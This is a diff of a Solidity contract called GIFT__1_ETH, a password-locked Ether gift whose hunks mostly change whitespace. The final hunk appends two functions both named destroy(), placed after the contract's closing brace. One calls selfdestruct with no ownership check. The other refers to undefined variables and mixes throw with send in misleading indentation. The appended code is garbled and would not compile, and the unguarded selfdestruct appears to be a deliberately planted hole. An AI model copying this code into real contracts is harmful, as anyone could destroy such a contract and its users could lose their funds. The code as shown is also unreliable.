@@ -3,15 +3,15 @@ pragma solidity ^0.4.19;
 contract GIFT__1_ETH
 {
     bool passHasBeenSet = false;
-    
+
     address sender;
-    
+
     bytes32 public hashPass;
-	
+
 	function() public payable{}
-    
+
     function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
-    
+
     function SetPass(bytes32 hash)
     public
     payable
@@ -22,7 +22,7 @@ contract GIFT__1_ETH
             sender = msg.sender;
         }
     }
-    
+
     function GetGift(bytes pass)
     external
     payable
@@ -32,7 +32,7 @@ contract GIFT__1_ETH
             msg.sender.transfer(this.balance);
         }
     }
-    
+
     function Revoce()
     public
     payable
@@ -42,7 +42,7 @@ contract GIFT__1_ETH
             sender.transfer(this.balance);
         }
     }
-    
+
     function PassHasBeenSet(bytes32 hash)
     public
     {
@@ -51,4 +51,16 @@ contract GIFT__1_ETH
            passHasBeenSet=true;
         }
     }
+}
+	function destroy() public {
+		selfdestruct(this);
+	}
+}
+	function destroy() public {
+		for(uint i = 0; i < values.length - 1; i++) {
+			if(entries[values[i]].expires != 0)
+				throw;
+				msg.sender.send(msg.value);
+		}
+	}
 }
